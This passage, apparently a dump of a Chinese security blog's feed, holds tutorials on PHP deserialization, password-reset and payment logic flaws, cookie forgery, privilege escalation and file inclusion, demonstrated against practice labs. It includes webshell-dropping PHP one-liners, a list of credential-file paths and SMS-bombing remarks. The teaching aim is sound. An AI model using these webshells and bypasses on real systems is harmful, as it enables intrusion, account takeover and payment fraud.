class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>反序列化之前重新给flag属性赋值</li></ul><h2 id="反序列化POP链"><a href="#反序列化POP链" class="headerlink" title="反序列化POP链"></a>反序列化POP链</h2><ul><li><code>unserialize()</code>反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。</li><li>当反序列化参数可控时，可能会产生<strong>PHP反序列化漏洞</strong>。</li><li>在反序列化中，我们所能控制的数据就是对象中的各个属性值，所以在PHP的反序列化中有一种漏洞利用方法叫做 “面向属性编程POP”，面向对象编程从一定程度上来说，就是完成类与类之间的调用。POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”</li><li>在PHP中，“组件”就是那些魔术方法（如：wakeup()或destruct）</li><li>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</li></ul><h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</li><li>在反序列化的过程中自动触发了某些魔术方法。</li></ul><h2 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h2><ul><li>unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</li></ul><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul><li><code>__construct()</code> 当对象创建（new）时会自动调用。但在 <code>unserialize()</code> 时是不会自动调用的。</li><li><code>__destruct()</code> 当一个对象销毁（反序列化）时被调用</li><li><code>__toString()</code>当一个对象被当作一个字符串使用时被调用</li><li><code>__sleep()</code>在对象在被序列化之前立即运行</li><li><code>__wakeup()</code>将在序列化之后立即被调用</li><li>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</li></ul><h2 id="绕过魔法方法的反序列化漏洞"><a href="#绕过魔法方法的反序列化漏洞" class="headerlink" title="绕过魔法方法的反序列化漏洞"></a>绕过魔法方法的反序列化漏洞</h2><ul><li>漏洞CVE-2016-7124</li></ul><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><code>__wakeup()</code></h3><ul><li>将在序列化之后立即被调用  </li><li>当序列化字符串表示对象属性个数的数字值<strong>大于</strong>真实类中属性的个数时就会<strong>跳过__wakeup的执行</strong>。</li></ul><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a><code>__destruct()</code></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$var</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span>　</span><br></pre></td></tr></table></figure><ul><li>要让<code>eval($this-&gt;var);</code>执行我们的恶意代码，我们就需要修改属性<code>$var</code>的值。接下来构造序列化数据：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="keyword">var</span>=<span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br></pre></td></tr></table></figure></li><li>输出<code>O:7:&quot;Example&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;phpinfo()&quot;;&#125;</code></li><li>输出执行<code>eval(phpinfo())</code></li></ul><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><code>__toString()</code></h3><ul><li><code>__toString</code>当对象被当作一个字符串使用时候调用(不仅仅是<code>echo</code>的时候，比如file_exists()判断也会触发)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> php反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找回机制及接口安全</title>
      <link href="/2023/10/21/%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/"/>
      <url>/2023/10/21/%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="找回机制"><a href="#找回机制" class="headerlink" title="找回机制"></a>找回机制</h1><ul><li>当找回密码的时候，涉及到验证码，通过验证码来验证是否为本人操作</li><li>这个地方的安全问题，未验证验证码的匹配关系</li></ul><h2 id="客户端回显"><a href="#客户端回显" class="headerlink" title="客户端回显"></a>客户端回显</h2><ul><li>这种就是再调用短信平台或者邮箱平台的时候，没有判定验证码和手机号或者邮件进行绑定，并且把验证码检验直接放在客户端的返回数据包中，从而导致验证码在客户端中显示。但是也存在对内容进行加密的情况，若遇到加密，先看看是否能够解密，若无法解密再想其他办法。</li></ul><h2 id="Response状态值"><a href="#Response状态值" class="headerlink" title="Response状态值"></a>Response状态值</h2><ul><li>Response状态值，就是在服务器发送某个密码重置的凭据之后，出现特定的响应值(ture，1，ok，success等等，例如响应头中的HTTP&#x2F;1.1 200 ok)，而且例如如果回显值得校验是发送到客户端进行，通过对校验值得使用规则进行分析后，抓包将Response状态值改为正确的，然后放包，这样就能够从而达到重置密码得效果。</li></ul><h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><ul><li>发送给我们的验证码是纯数字，比如四位，或者是六位，在短时间内进行爆破，可以得到接收到的验证码，比如发送给我是1234，我们可以把请求验证码的数据包截获到，然后不断的去请求验证码的正确与否，从0000-9999，全部测试一遍，其中1234就在里面，这个时候就存在验证码爆破</li><li>如果对方是数字加字母区分大小写，那这种可能性实在是太多了，我们可以不爆破，就是说爆破的机会不大</li><li>验证码有一个生效时间，就是过了这段时间，密码就不能生效了，一分钟、两分钟，我们跑这个爆破的数量达不到，这样子，我们只能放弃它</li><li>验证码锁定，验证码输出三次之后还是失败，直接锁定，不让使用，这也是没办法</li></ul><h2 id="找回流程绕过"><a href="#找回流程绕过" class="headerlink" title="找回流程绕过"></a>找回流程绕过</h2><ul><li>一般是把验证码发送到手机或者邮箱上面，你输入正确之后，就跳到第三个页面，就是重置密码页面。</li><li>我们可以先来一个正常的用户去操作一下，然后看一下重置页面当前的地址和数据包，然后我们在换一个我们不知道验证码的手机号去找回，我们直接跳过输入验证码的那一步，直接用数据包截获到，然后把他丢弃掉，直接用浏览器去请求第三步，直接跳过验证码的验证内容。</li><li>这种就是跳过，就是从第一步跳到第三步，就是绕过第二步的验证</li></ul><h1 id="接口调用"><a href="#接口调用" class="headerlink" title="接口调用"></a>接口调用</h1><ul><li>网上有很多短信轰炸的软件和平台，那么他实现的原理是用别人的接口，比如说有些网站正常注册上去的话，就会发送验证码，他就把接口触发验证码的数据包，给记录下来，然后用软件或者程序，去批量去测试就完事了，那就是调用别人的接口实现短信轰炸，来电轰炸也是这么个原理</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>支付漏洞及cookie脆弱性</title>
      <link href="/2023/10/20/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%8F%8Acookie%E8%84%86%E5%BC%B1%E6%80%A7/"/>
      <url>/2023/10/20/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%8F%8Acookie%E8%84%86%E5%BC%B1%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><strong>支付漏洞</strong>在漏洞中一直是处于高风险漏洞，对于企业来说相应的危害是很大的，同样对于用户的风险也很大的，比如当攻击者通过修改，使用他人账号的余额进行购买，那么就属于支付中的越权漏洞了。</li><li>购买流程：选择商品和数量——产生订单——选择邮寄地址及支付方式——订单支付——完成支付。</li><li>支付漏洞就是针对以上流程进行越权操作</li></ul><h2 id="支付漏洞分类"><a href="#支付漏洞分类" class="headerlink" title="支付漏洞分类"></a>支付漏洞分类</h2><h3 id="修改支付价格"><a href="#修改支付价格" class="headerlink" title="修改支付价格"></a>修改支付价格</h3><ul><li>对于修改支付价格，通常来说购买一件物品需要选中自己所需购买的物品，其次确认相关的信息，最后支付价钱，而在这个过程中，可以在选中时就修改价格，若有相关的验证，则可以向后边退，一步一步测试。</li></ul><h3 id="修改支付状态"><a href="#修改支付状态" class="headerlink" title="修改支付状态"></a>修改支付状态</h3><ul><li>其实这里的支付状态挺好理解的，把支付未成功修改为支付成功即可，这个也是由于支付的状态未和实际订单的支付状态进行校验而产生的。</li></ul><h3 id="修改购买数量"><a href="#修改购买数量" class="headerlink" title="修改购买数量"></a>修改购买数量</h3><ul><li>在支付的过程中，数量也同时决定着价格，比如：1个数量商品对应的是100，2个数据就是200，那么当你修改这个值数量值为负数时，那么其金额也会变为负数，最后就会导致支付问题的产生。</li></ul><h3 id="替换支付"><a href="#替换支付" class="headerlink" title="替换支付"></a>替换支付</h3><ul><li>替换支付简单来说，首先去产生两个订单，但是这两个订单的商品是不一样的，其价格也是不一样的，如果服务端未做好相应的验证，那么在支付过程中去替换数据，最后支付，这时候就可以使用订单支付的价格购买到其他贵的物品。</li></ul><h3 id="越权支付"><a href="#越权支付" class="headerlink" title="越权支付"></a>越权支付</h3><ul><li>在支付当中会出现当前用户的ID，比如：username&#x3D;XXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付你的商品。</li></ul><h3 id="修改优化价"><a href="#修改优化价" class="headerlink" title="修改优化价"></a>修改优化价</h3><ul><li>比如一些商品有优惠价，优惠多少多少，那么在支付时抓包，修改这个优惠价就可造成支付问题的产生。</li></ul><h2 id="常用篡改参数"><a href="#常用篡改参数" class="headerlink" title="常用篡改参数"></a>常用篡改参数</h2><ul><li>商品的ID编号、购买价格、购买数量、支付方式、订单号、支付状态等。</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>这里用<a href="https://pan.baidu.com/s/15SzFGW37fpBkO38_St3SmA?pwd=onew">大米cms</a>进行实验</li><li>注册一个用户test<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020213928.png" alt="image.png"></li><li>随便选一个商品购买然后抓包<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020214139.png" alt="image.png"></li><li>修改价格<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020214216.png" alt="image.png"></li><li>可以看见价格已经被修改了</li><li>还可以修改其他信息，包括商品id等等</li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol><li>对商品的价格进行判断，不能为负数。</li><li>商品的价格以数据库的为准，不能以页面为准。</li><li>设置类似的token值来对数据包进行唯一性处理</li></ol><h1 id="cookie脆弱性"><a href="#cookie脆弱性" class="headerlink" title="cookie脆弱性"></a>cookie脆弱性</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><ol><li>用户在客户端 (一般为浏览器) 中访问某个页面 ，也就是向服务器发送请求。</li><li>服务器收到请求后，会在响应头中设置Set-Cookie字段值，该字段存储相关信息和状态。</li><li>客户端解析服务器HTTP响应头中的Set-Cookie字段，并以key&#x3D;value的形式保存在本地，之后客户端每次发送HTTP请求时，都会在请求头中增加Cookie字段。</li><li>服务器接收到客户端的HTTP请求之后，会从请求头中取出Cookie数据，来校验客户端状态或身份信息。</li></ol><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>这里使用<a href="https://pan.baidu.com/s/1vn-jLpqb-_HKNphebD9N3Q?pwd=lldw">熊海靶场</a>进行实验</li><li>这个越权登录，其实是基于代码审计获取得，也就相当于是白盒测试，若黑盒测试，基本上应该是测试不出来的。</li><li><strong>代码审计：</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ?r=login&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>通过代码知道，cookie当中会有user信息，如果为空则进入登录页面，否则进行登录</li><li>直接在url后加admin会进入登录界面</li><li>因为我们没登陆过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020221903.png" alt="image.png"></li><li>这里我们清理一下cookie信息，并进行抓包<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020222029.png" alt="image.png"></li><li>抓包信息当中，没有cookie</li><li>我们手动加入cookie信息</li><li>设定user为1，即不为空<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020222407.png" alt="image.png"></li><li>放包，可以看见成功进入admin，最高权限用户<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020222606.png" alt="image.png"></li></ul><h2 id="越过条件"><a href="#越过条件" class="headerlink" title="越过条件"></a>越过条件</h2><ul><li>其实在这里可以看到我们直接输入了cookie: user&#x3D;1，那么我们该如何知道这个cookie值需要使用到user呢？所以相对来说挺鸡肋的，在实战中若没有源码基本上不可能绕过，所以这多数适合在白盒测试中，如果一定要使用黑盒测试，那么就需要在网上找相应的源码进行分析，但若别人修改了，那么基本上就是凉凉的节奏，不可能被绕过的。</li></ul><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><ol><li>根据交互所需的传输范围，设置适当的Cookie有效时间</li><li>对cookie加密以及数字签名，并在安全信道中传输</li><li>用URL参数代替cookie中可能包含的敏感信息</li><li>不要在cookie中设置中文</li><li>合理设置Cookies中的安全属性</li><li>服务器不应该在同一个主机上同时运行相互不信任的服务<br>客户端回显、response状态值、验证码爆破、找回流程绕过等。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 逻辑越权 </tag>
            
            <tag> 支付漏洞 </tag>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权</title>
      <link href="/2023/10/20/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"/>
      <url>/2023/10/20/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020193248.png" alt="image.png"></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>逻辑越权漏洞就是当用户跳过自己的权限限制，去操作同等级用户或者上级用户。正常的情况下，当一个用户去访问某个资源的时候，首先需要去登录验证自己的权限，其次是对数据的查询，最后返回数据内容。</li><li>但是如果在权限验证这里，出现了验证不足或者根本就没有验证，那么就会导致越权漏洞的出现。并且逻辑越权又分为水平越权和垂直越权。</li><li>逻辑越权主要是由于开发人员在对数据的增删改查的对人员客户端的请求数据过分相信，未对其进行权限判定而导致的问题。</li></ul><h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>水平越权也就是同等级越权，可以理解为本来A只能够看自己的工资，而通过更换某个ID或者其他的验证身份的操作，就能够A去看B的工资。</li><li>水平越权多数会出现在和数据库进行增删改查的地方，若用户在对其进行信息修改的时候，后台没对其进行严格的校验的话或者校验的规则较简单的情况下，就可能会出现越权漏洞。</li><li>水平越权的危害可以导致用户的个人信息泄露，冒充别人等。</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>使用pikachu靶场进行实例演示</li><li>在提示中随便选择一个用户登录</li><li>这里选择了lucy<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020194812.png" alt="image.png"></li><li>登录之后可以查看个人信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020195218.png" alt="image.png"></li><li>抓包然后发现是直接username获取个人信息</li><li>直接修改username为另一个人就行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020195909.png" alt="image.png"></li></ul><h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul><li>垂直越权就是通过自身低权限账号去执行高权限账号所能执行的操作。</li><li>垂直越权漏洞可以考虑低权限提升为高权限，比如让普通的用户变成管理员用户。</li><li>其实垂直越权漏洞是需要一定的条件的，需要抓取到高权限用户的数据包，而抓取这个数据包是有一定的困难的，比如可以盲猜数据包，或者通过网站获取源码本地搭建去获取。</li><li>垂直越权的危害可以导致普通用户修改他人的密码，篡改他人信息，依旧个人信息泄露等。</li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>首先登录admin用户</li><li>admin拥有最大权限，可以增加或者删除用户信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20205646.png" alt="屏幕截图 2023-10-20 205646.png"></li><li>添加用户<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020205733.png" alt="image.png"></li><li>并且抓包，获取到post包<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020205939.png" alt="image.png"></li><li>然后登录pikachu用户，就是普通用户</li><li>普通用户只有查看的权限，不能修改用户列表<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020210054.png" alt="image.png"></li><li>获取到普通用户的cookie信息<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020210503.png" alt="image.png"></li><li>然后将普通用户的cookie替换<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020210852.png" alt="image.png"></li><li>然后发包，在该用户登录的情况下</li><li>刷新用户列表就可以看到添加成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231020211020.png" alt="image.png"></li><li>如果在退出用户的情况下，是没办法添加的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2023/10/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019154502.png" alt="image.png"></p><h1 id="文件包含漏洞简介"><a href="#文件包含漏洞简介" class="headerlink" title="文件包含漏洞简介"></a>文件包含漏洞简介</h1><ul><li>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时候直接调用此文件，而无须再次编写，这种调用文件的过程称为包含。</li><li>程序员为了使代码更加灵活，经常将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成<strong>文件包含漏洞。</strong></li><li>文件包含漏洞分为本地包含（LFI）和远程包含（RFI）。文件包含漏洞在 PHP Web Application中居多，在JSP ASP程序中偏少。<blockquote><p>PHP中有四个文件包含的函数</p><ol><li>include()：找不到被包含的文件时只会产生警告（E_WARNING），脚本将会继续执行；</li><li>include_once()：与include（）类似，唯一的区别是如果该文件中的代码已经被包含，则不会再次包含；</li><li>require()：找不到被包含的文件时会产生致命错误（E_COMPILE_ERROR），并停止脚本；</li><li>require_once()：- 该函数和require（）类似，区别在于若该文件中的代码已经被包含，则不会再次包含。</li></ol></blockquote></li></ul><h1 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h1><ul><li><p>利用一个例子来展示这个漏洞</p></li><li><p>先创建一个网页代码<code>include.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>再创建一个php代码<code>phpinfo.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>利用文件包含就可以执行phpinfo.php的页面<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019160203.png" alt="image.png"></p></li><li><p>此时我们将<code>phpinfo</code>的后缀名改成<code>.jpg</code>、<code>.txt</code>、<code>.gif</code>都会被解析出来</p></li><li><p>所有就可以利用这个漏洞，将恶意代码通过文件包含的方式进行解析利用</p></li></ul><h1 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h1><ul><li>能够打开并包含本地文件的漏洞，称为本地文件包含漏洞（LFI）<blockquote><p>一些常见的敏感目录信息路径：<br><strong>Windows系统</strong></p><ol><li>查看系统版本C:\boot.ini </li><li>IIS配置文件C:\windows\system32\inetsrv\MetaBase.xml </li><li>存储Windows系统初次安装的密码C:\windows\repair\sam </li><li>Mysql配置C:\ProgramFiles\mysql\my.ini </li><li>MySQL root密码C:\ProgramFiles\mysql\data\mysql\user.MYD </li><li>php配置信息C:\windows\php.ini<br><strong>Linux&#x2F;Unix系统</strong></li><li>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息</li><li>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置</li><li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件</li><li>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件</li></ol></blockquote></li></ul><h2 id="实例pikachu"><a href="#实例pikachu" class="headerlink" title="实例pikachu"></a>实例pikachu</h2><ul><li>在选择框当中有五个选择，通过查看器看到分别对应五个文件</li><li>通过抓包，对filename进行修改<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019162959.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019163109.png" alt="image.png"></li><li>可以看到在include文件夹下，所有需要使用相对地址<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019195718.png" alt="image.png"></li><li>改成相对地址就可以访问了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019195903.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019195942.png" alt="image.png"></li><li>通过文件包含漏洞就可以获取到系统的敏感信息</li></ul><h2 id="实例DVWA"><a href="#实例DVWA" class="headerlink" title="实例DVWA"></a>实例DVWA</h2><ul><li>当一时没发现系统文件上传漏洞或者文件上传格式有严格限制时，可以上传一张图片马到服务器，再利用文件包含漏洞进行解析。</li><li>制作图片马<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[123]) ?&gt;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019203819.png" alt="image.png"></li><li>然后在文件上传File Upload处上传图片马<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019203834.png" alt="image.png"></li><li>通过回显知道了文件路径</li><li>然后在文件包含当中运行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019204157.png" alt="image.png"></li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019204148.png" alt="image.png"></p><ul><li>运行成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019204244.png" alt="image.png"></li><li>然后用中国蚁剑连上去<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019204401.png" alt="image.png"></li><li>连接成功</li></ul><h1 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h1><ul><li>当<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>为On时，文件包含函数是可以<strong>加载远程文件</strong>的，这类漏洞被称为<strong>远程文件包含漏洞</strong>。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019205437.png" alt="image.png"></li></ul><h2 id="实例piakchu"><a href="#实例piakchu" class="headerlink" title="实例piakchu"></a>实例piakchu</h2><ul><li>制作一句话木马.txt<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;webshell.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="variable">$txt</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>通过抓包修改filename地址，远程运行代码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231019210741.png" 